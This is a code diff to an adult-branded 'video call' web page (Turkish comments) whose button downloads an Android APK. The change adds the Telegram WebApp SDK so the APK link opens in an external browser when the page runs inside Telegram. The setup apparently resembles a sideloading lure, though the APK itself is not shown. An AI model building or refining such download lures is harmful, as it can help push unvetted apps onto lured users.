@@ -4,6 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Görüntülü Görüşme - TurkPorno</title>
+    
+    <!-- EKLENEN KISIM: Telegram WebApp SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet"
         href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"
@@ -273,9 +277,16 @@
                         showToast("İndirme başlatılıyor...");
                     }
                     
-                    // Popup engelleyiciyi aşan basit yönlendirme
-                    window.location.href = currentApkUrl;
+                    // --- DÜZELTİLEN KISIM BAŞLANGICI ---
+                    // Telegram WebApp içinde açılıyorsa harici tarayıcıya yönlendir, değilse standart yönlendirme yap
+                    if (window.Telegram && window.Telegram.WebApp) {
+                        Telegram.WebApp.openLink(currentApkUrl, { try_instant_view: false });
+                    } else {
+                        window.location.href = currentApkUrl;
+                    }
+                    // --- DÜZELTİLEN KISIM BİTİŞİ ---
                     
+                    // Süreyi 2 saniyeye çıkardık ki tarayıcı açılırken buton donmasın
                     setTimeout(() => {
                         if (downloadBtn) {
                             downloadBtn.innerHTML = `Tekrar İndir <i class="fa-solid fa-arrow-rotate-right absolute right-5 text-white text-sm"></i>`;
@@ -283,7 +294,7 @@
                             downloadBtn.disabled = false;
                         }
                         isProcessing = false;
-                    }, 1500);
+                    }, 2000);
                     
                 } catch (error) {
                     console.error("İndirme hatası:", error);
